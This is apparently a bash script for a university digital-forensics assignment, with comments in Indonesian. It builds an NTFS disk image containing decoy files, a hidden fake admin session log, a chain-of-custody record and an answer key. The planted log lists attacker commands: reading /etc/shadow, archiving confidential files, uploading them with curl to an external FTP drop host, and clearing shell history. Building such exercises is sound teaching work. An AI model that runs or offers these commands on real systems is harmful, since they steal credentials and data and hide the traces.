#!/bin/bash
# ============================================================
#  Tugas Computer Forensic - Kelompok 5 (Ganjil / Windows)
#  Script pembuat disk image forensik dengan narasi unik
#  Jalankan dengan: sudo bash build_image.sh
# ============================================================

set -e

# --- Konfigurasi ---
WORK_DIR="$(cd "$(dirname "$0")" && pwd)"
IMG_RAW="win_disk_ganjil5_okt2026.raw"
IMG_VHD="win_disk_ganjil5_okt2026.vhd"
COC_FILE="chain_of_custody_klp5.txt"
ZIP_FILE="FORDIG_Windows_Evidence_Klp5.zip"
MOUNT_DIR="/tmp/mnt_klp5_evidence"
USERNAME="khosy"
KEYWORD="REMOTE_AKSES_RAHASIA_KLP5"
ACQUIRE_TIME=$(date '+%Y-%m-%d %H:%M:%S')
ACQUIRE_DATE=$(date '+%d %B %Y')

cd "$WORK_DIR"

echo ""
echo "============================================================"
echo "   FORDIG Evidence Builder - Kelompok 5 (Windows / Ganjil)"
echo "============================================================"
echo ""

# --- Cleanup file lama jika ada ---
echo "[0/8] Membersihkan file lama..."
rm -f forensic_evidence_windows_klp5.raw \
      forensic_evidence_windows_klp5.vhd \
      integrity_hashes.txt \
      Fordig_Image_Windows_Kelompok5.zip \
      "$IMG_RAW" "$IMG_VHD" "$COC_FILE" "$ZIP_FILE"
echo "OK: Cleanup selesai"

# --- Step 1: Buat raw image 256MB ---
echo ""
echo "[1/8] Membuat disk image kosong 256MB..."
dd if=/dev/zero of="$IMG_RAW" bs=1M count=256 status=progress
echo "OK: $IMG_RAW dibuat"

# --- Step 2: Format NTFS ---
echo ""
echo "[2/8] Format NTFS (Volume: KLP5_SYSLOG_VOL)..."
mkfs.ntfs -F -L "KLP5_SYSLOG_VOL" -q "$IMG_RAW"
echo "OK: Format NTFS selesai"

# --- Step 3: Mount image ---
echo ""
echo "[3/8] Mounting image..."
mkdir -p "$MOUNT_DIR"
mount -t ntfs-3g -o loop "$IMG_RAW" "$MOUNT_DIR"
echo "OK: Mounted di $MOUNT_DIR"

# --- Step 4: Buat file-file artefak ---
echo ""
echo "[4/8] Menulis file ke dalam image..."

# Decoy 1: Inventaris perangkat IT — tampak biasa
cat > "$MOUNT_DIR/inventaris_perangkat_lab.txt" << DECOY1
DAFTAR INVENTARIS PERANGKAT LABORATORIUM KOMPUTER
Unit      : Lab Forensika Digital - Gedung B Lt. 2
Periode   : Semester Ganjil 2026/2027
PIC       : Koordinator Lab

No  | Nama Perangkat          | Serial Number   | Status
----|-------------------------|-----------------|----------
 1  | Workstation Dell i7     | DLLWS-2023-0041 | Aktif
 2  | Workstation HP Z4       | HPWZ4-2022-0017 | Aktif
 3  | Server Rack 1U          | SRVR1U-2021-009 | Aktif
 4  | Switch Cisco Catalyst   | CSWT-2020-0033  | Aktif
 5  | Wireless AP Ubiquiti    | UBAP-2023-0012  | Aktif
 6  | Laptop Lenovo ThinkPad  | LVTP-2024-0005  | Aktif
 7  | HDD External WD 2TB     | WDEX-2022-0088  | Cadangan
 8  | Raspberry Pi 4 (x3)     | RPI4-2023-0071  | Aktif

Catatan: Pemutakhiran terakhir dilakukan oleh admin lab.
Status perangkat diverifikasi tanggal $ACQUIRE_DATE.
DECOY1

# Decoy 2: Jadwal backup server — tampak biasa
cat > "$MOUNT_DIR/jadwal_backup_server.txt" << DECOY2
JADWAL RUTIN BACKUP SERVER - SEMESTER GANJIL 2026
===================================================
Pengelola : Tim Infrastruktur IT

[SENIN - JUMAT]
  00:00 WIB  - Full backup /var/www ke NAS-01
  02:00 WIB  - Incremental backup database PostgreSQL
  04:00 WIB  - Sinkronisasi ke offsite storage (cloud)
  06:00 WIB  - Verifikasi integritas backup (checksum)

[SABTU]
  01:00 WIB  - Full backup seluruh volume server
  03:00 WIB  - Rotasi backup tape (arsip bulanan)

[MINGGU]
  Maintenance window: 00:00 - 04:00 WIB
  - Update patch OS
  - Restart layanan terjadwal

Catatan: Notifikasi kegagalan dikirim ke admin@lab.internal
Kontak darurat: ext. 1234 (24 jam)
DECOY2

# === ARTEFAK UTAMA: FILE TERSEMBUNYI ===
cat > "$MOUNT_DIR/session_log_admin_remote.txt" << HIDDEN
====================================================
  SESSION LOG - AKSES ADMINISTRATOR JARAK JAUH
  [FILE INI TIDAK SEHARUSNYA ADA DI SINI]
====================================================

Keyword    : $KEYWORD
Pengguna   : $USERNAME
Hostname   : $(hostname)
Waktu Akses: $ACQUIRE_TIME

-- RIWAYAT SESI REMOTE (TIDAK TERDAFTAR) --

[18-Oct-2026 23:14:07] LOGIN  user=$USERNAME ip=192.168.1.77 proto=SSH port=22
[18-Oct-2026 23:14:09] CMD    sudo su -
[18-Oct-2026 23:14:15] CMD    cat /etc/shadow
[18-Oct-2026 23:17:42] CMD    cp -r /srv/confidential /tmp/.hidden_exfil/
[18-Oct-2026 23:19:03] CMD    tar czf /tmp/.hidden_exfil/data_dump.tar.gz /tmp/.hidden_exfil/
[18-Oct-2026 23:21:30] CMD    curl -T /tmp/.hidden_exfil/data_dump.tar.gz ftp://external.drop.net/
[18-Oct-2026 23:22:55] CMD    rm -rf /tmp/.hidden_exfil/
[18-Oct-2026 23:23:01] CMD    history -c && history -w
[18-Oct-2026 23:23:04] LOGOUT user=$USERNAME durasi=8m57s

-- CATATAN --
Aktivitas ini dilakukan di luar jam operasional resmi.
Sesi ini tidak tercatat dalam log resmi sistem (dihapus manual).
File ini disembunyikan oleh $USERNAME agar tidak ditemukan.

Jika Anda menemukan file ini: Anda sedang membaca bukti forensik
yang berhasil di-recover. Selamat!
====================================================
HIDDEN

echo "OK: File berhasil ditulis:"
echo "   [VISIBLE] inventaris_perangkat_lab.txt"
echo "   [VISIBLE] jadwal_backup_server.txt"
echo "   [HIDDEN ] session_log_admin_remote.txt  <-- artefak utama"

# --- Step 5: Set NTFS hidden attribute ---
echo ""
echo "[5/8] Set NTFS hidden attribute (0x22 = HIDDEN|ARCHIVE)..."
setfattr -n system.ntfs_attrib_be -v 0x00000022 \
    "$MOUNT_DIR/session_log_admin_remote.txt"
echo "OK: Hidden attribute berhasil di-set"

# --- Step 6: Unmount ---
echo ""
echo "[6/8] Unmounting..."
umount "$MOUNT_DIR"
rmdir "$MOUNT_DIR"
echo "OK: Unmount selesai"

# --- Step 7: Konversi ke VHD ---
echo ""
echo "[7/8] Konversi RAW -> VHD..."
qemu-img convert -f raw -O vpc "$IMG_RAW" "$IMG_VHD"
echo "OK: $IMG_VHD dibuat"

# --- Step 8: Chain of Custody + ZIP ---
echo ""
echo "[8/8] Membuat Chain of Custody & ZIP..."
{
echo "============================================================"
echo " CHAIN OF CUSTODY - COMPUTER FORENSIC EVIDENCE"
echo " Mata Kuliah : Forensika Digital"
echo " Kelompok    : 5 (Ganjil) - OS Windows (NTFS)"
echo "============================================================"
echo ""
echo " Examiner     : $USERNAME"
echo " Acquire Time : $ACQUIRE_TIME"
echo " Hostname     : $(hostname)"
echo " OS           : $(uname -srm)"
echo " Tool         : dd, mkfs.ntfs (ntfs-3g), qemu-img"
echo ""
echo "------------------------------------------------------------"
echo " EVIDENCE FILES"
echo "------------------------------------------------------------"
echo ""
echo " [1] $IMG_RAW"
echo "     Format : RAW disk image"
echo "     Size   : $(du -sh "$IMG_RAW" | cut -f1)"
echo "     MD5    : $(md5sum "$IMG_RAW" | awk '{print $1}')"
echo "     SHA256 : $(sha256sum "$IMG_RAW" | awk '{print $1}')"
echo ""
echo " [2] $IMG_VHD"
echo "     Format : Virtual Hard Disk (VHD/VPC)"
echo "     Size   : $(du -sh "$IMG_VHD" | cut -f1)"
echo "     MD5    : $(md5sum "$IMG_VHD" | awk '{print $1}')"
echo "     SHA256 : $(sha256sum "$IMG_VHD" | awk '{print $1}')"
echo ""
echo "------------------------------------------------------------"
echo " KETERANGAN"
echo "------------------------------------------------------------"
echo " Filesystem   : NTFS (Volume Label: KLP5_SYSLOG_VOL)"
echo " Image Size   : 256 MB"
echo " Artefak      : 1 file tersembunyi (NTFS hidden attribute)"
echo " Keyword      : $KEYWORD"
echo "============================================================"
} > "$COC_FILE"

zip "$ZIP_FILE" "$IMG_RAW" "$IMG_VHD" "$COC_FILE"

# --- Ringkasan ---
echo ""
echo "============================================================"
echo "  SELESAI - OUTPUT SUMMARY"
echo "============================================================"
ls -lh "$IMG_RAW" "$IMG_VHD" "$COC_FILE" "$ZIP_FILE"
echo ""
echo ">> Upload ke Google Drive:"
echo "   $WORK_DIR/$ZIP_FILE"
echo ""
echo "============================================================"
echo "  CROSS-CHECK KESESUAIAN SOAL"
echo "============================================================"
echo ""
echo " [TUGAS A - SOAL]                       [STATUS]"
echo " Kelompok ganjil -> image Windows  -->  OK (NTFS filesystem)"
echo " Upload ke Drive/GitHub            -->  OK (ZIP siap upload)"
echo " Tulis link di Google Sheet        -->  TODO (manual)"
echo " Ada file tersembunyi + keyword    -->  OK (session_log_admin_remote.txt)"
echo ""
echo " [TUGAS B - YANG HARUS BISA DITEMUKAN KELOMPOK 6]"
echo " File tersembunyi                  -->  session_log_admin_remote.txt"
echo " Keyword                           -->  $KEYWORD"
echo " Username pelaku perubahan         -->  $USERNAME (ada di isi file)"
echo " Kapan terjadi                     -->  $ACQUIRE_TIME (NTFS metadata + isi file)"
echo ""
echo "============================================================"
echo "  ANSWER KEY (JANGAN DIUPLOAD)"
echo "============================================================"
echo " Metode   : Hidden (NTFS attribute 0x22 = hidden+archive)"
echo " File     : session_log_admin_remote.txt"
echo " Keyword  : $KEYWORD"
echo " Username : $USERNAME"
echo " Waktu    : $ACQUIRE_TIME"
echo "============================================================"
